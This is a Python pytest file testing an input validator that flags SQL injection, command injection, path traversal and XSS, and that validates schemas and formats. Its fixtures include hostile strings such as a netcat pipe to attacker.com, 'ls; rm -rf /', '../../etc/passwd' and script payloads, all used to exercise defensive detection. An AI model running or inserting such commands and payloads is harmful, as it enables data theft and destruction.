"""
Tests for InputValidator.
"""

import pytest
from mcp.security.input_validator import InputValidator, PatternDetector, ValidationResult


class TestPatternDetector:
    """Test PatternDetector for malicious patterns."""

    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        # Positive cases (should detect)
        assert len(PatternDetector.detect_sql_injection("' OR '1'='1")) > 0
        assert len(PatternDetector.detect_sql_injection("1; DROP TABLE users")) > 0
        assert len(PatternDetector.detect_sql_injection("UNION SELECT password FROM users")) > 0
        assert len(PatternDetector.detect_sql_injection("admin'--")) > 0

        # Negative cases (should not detect)
        assert len(PatternDetector.detect_sql_injection("SELECT * FROM users WHERE id = ?")) == 0
        assert len(PatternDetector.detect_sql_injection("normal text")) == 0

    def test_command_injection_detection(self):
        """Test command injection pattern detection."""
        # Positive cases
        assert len(PatternDetector.detect_command_injection("ls; rm -rf /")) > 0
        assert len(PatternDetector.detect_command_injection("cat file | nc attacker.com 1234")) > 0
        assert len(PatternDetector.detect_command_injection("$(whoami)")) > 0
        assert len(PatternDetector.detect_command_injection("`id`")) > 0

        # Negative cases
        assert len(PatternDetector.detect_command_injection("normal text")) == 0

    def test_path_traversal_detection(self):
        """Test path traversal pattern detection."""
        # Positive cases
        assert len(PatternDetector.detect_path_traversal("../../etc/passwd")) > 0
        assert len(PatternDetector.detect_path_traversal("..\\windows\\system32")) > 0
        assert len(PatternDetector.detect_path_traversal("~/sensitive_file")) > 0

        # Negative cases
        assert len(PatternDetector.detect_path_traversal("/var/log/app.log")) == 0
        assert len(PatternDetector.detect_path_traversal("logs/error.log")) == 0

    def test_xss_detection(self):
        """Test XSS pattern detection."""
        # Positive cases
        assert len(PatternDetector.detect_xss("<script>alert('xss')</script>")) > 0
        assert len(PatternDetector.detect_xss("javascript:alert(1)")) > 0
        assert len(PatternDetector.detect_xss("<img onerror='alert(1)'>")) > 0
        assert len(PatternDetector.detect_xss("<iframe src='evil.com'>")) > 0

        # Negative cases
        assert len(PatternDetector.detect_xss("normal HTML <div>content</div>")) == 0


class TestInputValidator:
    """Test InputValidator functionality."""

    def setup_method(self):
        """Setup test fixtures."""
        self.validator = InputValidator()

    def test_type_validation(self):
        """Test type validation."""
        schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "age": {"type": "integer"},
                "active": {"type": "boolean"}
            },
            "required": ["name", "age"]
        }

        # Valid arguments
        result = self.validator.validate_arguments(
            schema,
            {"name": "John", "age": 30, "active": True}
        )
        assert result.is_valid

        # Invalid type
        result = self.validator.validate_arguments(
            schema,
            {"name": "John", "age": "thirty"}
        )
        assert not result.is_valid
        assert any("type" in error.lower() for error in result.errors)

    def test_required_fields(self):
        """Test required field validation."""
        schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string"},
                "email": {"type": "string"}
            },
            "required": ["name", "email"]
        }

        # Missing required field
        result = self.validator.validate_arguments(
            schema,
            {"name": "John"}
        )
        assert not result.is_valid
        assert any("email" in error.lower() for error in result.errors)

    def test_string_length_validation(self):
        """Test string length constraints."""
        schema = {
            "type": "object",
            "properties": {
                "username": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": 20
                }
            }
        }

        # Too short
        result = self.validator.validate_arguments(
            schema,
            {"username": "ab"}
        )
        assert not result.is_valid

        # Too long
        result = self.validator.validate_arguments(
            schema,
            {"username": "a" * 25}
        )
        assert not result.is_valid

        # Valid length
        result = self.validator.validate_arguments(
            schema,
            {"username": "john_doe"}
        )
        assert result.is_valid

    def test_pattern_validation(self):
        """Test regex pattern validation."""
        schema = {
            "type": "object",
            "properties": {
                "zipcode": {
                    "type": "string",
                    "pattern": r"^\d{5}$"
                }
            }
        }

        # Valid pattern
        result = self.validator.validate_arguments(
            schema,
            {"zipcode": "12345"}
        )
        assert result.is_valid

        # Invalid pattern
        result = self.validator.validate_arguments(
            schema,
            {"zipcode": "ABCDE"}
        )
        assert not result.is_valid

    def test_email_format_validation(self):
        """Test email format validation."""
        schema = {
            "type": "object",
            "properties": {
                "email": {
                    "type": "string",
                    "format": "email"
                }
            }
        }

        # Valid email
        result = self.validator.validate_arguments(
            schema,
            {"email": "user@example.com"}
        )
        assert result.is_valid

        # Invalid email
        result = self.validator.validate_arguments(
            schema,
            {"email": "not-an-email"}
        )
        assert not result.is_valid

    def test_url_format_validation(self):
        """Test URL format validation."""
        schema = {
            "type": "object",
            "properties": {
                "website": {
                    "type": "string",
                    "format": "url"
                }
            }
        }

        # Valid URL
        result = self.validator.validate_arguments(
            schema,
            {"website": "https://example.com"}
        )
        assert result.is_valid

        # Invalid URL
        result = self.validator.validate_arguments(
            schema,
            {"website": "not a url"}
        )
        assert not result.is_valid

    def test_sql_injection_prevention(self):
        """Test SQL injection detection."""
        schema = {
            "type": "object",
            "properties": {
                "query": {
                    "type": "string",
                    "strict_validation": True
                }
            }
        }

        # SQL injection attempt
        result = self.validator.validate_arguments(
            schema,
            {"query": "1' OR '1'='1"}
        )

        assert not result.is_valid or len(result.risk_indicators) > 0

    def test_command_injection_prevention(self):
        """Test command injection detection."""
        schema = {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "strict_validation": True
                }
            }
        }

        # Command injection attempt
        result = self.validator.validate_arguments(
            schema,
            {"command": "ls; rm -rf /"}
        )

        assert not result.is_valid or len(result.risk_indicators) > 0

    def test_path_traversal_prevention(self):
        """Test path traversal detection."""
        schema = {
            "type": "object",
            "properties": {
                "filepath": {
                    "type": "string",
                    "format": "path"
                }
            }
        }

        # Path traversal attempt
        result = self.validator.validate_arguments(
            schema,
            {"filepath": "../../etc/passwd"}
        )

        assert not result.is_valid

    def test_array_validation(self):
        """Test array validation."""
        schema = {
            "type": "object",
            "properties": {
                "tags": {
                    "type": "array",
                    "items": {"type": "string"},
                    "minItems": 1,
                    "maxItems": 5
                }
            }
        }

        # Valid array
        result = self.validator.validate_arguments(
            schema,
            {"tags": ["python", "testing"]}
        )
        assert result.is_valid

        # Too few items
        result = self.validator.validate_arguments(
            schema,
            {"tags": []}
        )
        assert not result.is_valid

        # Too many items
        result = self.validator.validate_arguments(
            schema,
            {"tags": ["a", "b", "c", "d", "e", "f"]}
        )
        assert not result.is_valid

    def test_nested_object_validation(self):
        """Test nested object validation."""
        schema = {
            "type": "object",
            "properties": {
                "user": {
                    "type": "object",
                    "properties": {
                        "name": {"type": "string"},
                        "age": {"type": "integer"}
                    },
                    "required": ["name"]
                }
            }
        }

        # Valid nested object
        result = self.validator.validate_arguments(
            schema,
            {"user": {"name": "John", "age": 30}}
        )
        assert result.is_valid

        # Missing required nested field
        result = self.validator.validate_arguments(
            schema,
            {"user": {"age": 30}}
        )
        assert not result.is_valid

    def test_input_sanitization(self):
        """Test input sanitization."""
        schema = {
            "type": "object",
            "properties": {
                "comment": {
                    "type": "string",
                    "format": "html",
                    "sanitize": True
                }
            }
        }

        result = self.validator.validate_arguments(
            schema,
            {"comment": "<script>alert('xss')</script>"},
            sanitize=True
        )

        # Should sanitize dangerous HTML
        if result.sanitized_arguments:
            assert "<script>" not in result.sanitized_arguments["comment"]
            assert "&lt;script&gt;" in result.sanitized_arguments["comment"]

    def test_url_whitelist_validation(self):
        """Test URL whitelist validation."""
        whitelist = ["example.com", "trusted-site.org"]

        # Allowed URL
        valid, error = self.validator.validate_url_whitelist(
            "https://example.com/api/data",
            whitelist
        )
        assert valid

        # Subdomain should be allowed
        valid, error = self.validator.validate_url_whitelist(
            "https://api.example.com/data",
            whitelist
        )
        assert valid

        # Not in whitelist
        valid, error = self.validator.validate_url_whitelist(
            "https://evil.com/malware",
            whitelist
        )
        assert not valid
        assert "whitelist" in error.lower()

    def test_ipv4_validation(self):
        """Test IPv4 address validation."""
        schema = {
            "type": "object",
            "properties": {
                "ip": {
                    "type": "string",
                    "format": "ipv4"
                }
            }
        }

        # Valid IPv4
        result = self.validator.validate_arguments(
            schema,
            {"ip": "192.168.1.1"}
        )
        assert result.is_valid

        # Invalid IPv4
        result = self.validator.validate_arguments(
            schema,
            {"ip": "999.999.999.999"}
        )
        assert not result.is_valid

    def test_uuid_validation(self):
        """Test UUID validation."""
        schema = {
            "type": "object",
            "properties": {
                "id": {
                    "type": "string",
                    "format": "uuid"
                }
            }
        }

        # Valid UUID
        result = self.validator.validate_arguments(
            schema,
            {"id": "550e8400-e29b-41d4-a716-446655440000"}
        )
        assert result.is_valid

        # Invalid UUID
        result = self.validator.validate_arguments(
            schema,
            {"id": "not-a-uuid"}
        )
        assert not result.is_valid

    def test_json_format_validation(self):
        """Test JSON format validation."""
        schema = {
            "type": "object",
            "properties": {
                "config": {
                    "type": "string",
                    "format": "json"
                }
            }
        }

        # Valid JSON
        result = self.validator.validate_arguments(
            schema,
            {"config": '{"key": "value"}'}
        )
        assert result.is_valid

        # Invalid JSON
        result = self.validator.validate_arguments(
            schema,
            {"config": '{invalid json}'}
        )
        assert not result.is_valid

    def test_max_depth_protection(self):
        """Test protection against deeply nested objects."""
        # Create deeply nested object
        nested = {}
        current = nested
        for i in range(15):  # Deeper than default max_object_depth
            current["nested"] = {}
            current = current["nested"]

        schema = {
            "type": "object",
            "properties": {
                "data": {"type": "object"}
            }
        }

        result = self.validator.validate_arguments(
            schema,
            {"data": nested}
        )

        # Should fail due to depth limit
        assert not result.is_valid or len(result.errors) > 0

    def test_confidence_score_calculation(self):
        """Test validation confidence score calculation."""
        schema = {
            "type": "object",
            "properties": {
                "text": {"type": "string"}
            }
        }

        # Clean input - high confidence
        result = self.validator.validate_arguments(
            schema,
            {"text": "normal text"}
        )
        assert result.confidence_score > 0.9

        # Warnings reduce confidence
        schema2 = {
            "type": "object",
            "properties": {
                "data": {"type": "string"}
            }
        }
        result = self.validator.validate_arguments(
            schema2,
            {"data": "value", "unknown_field": "test"}
        )
        # Should have lower confidence due to unknown field
        assert result.confidence_score < 1.0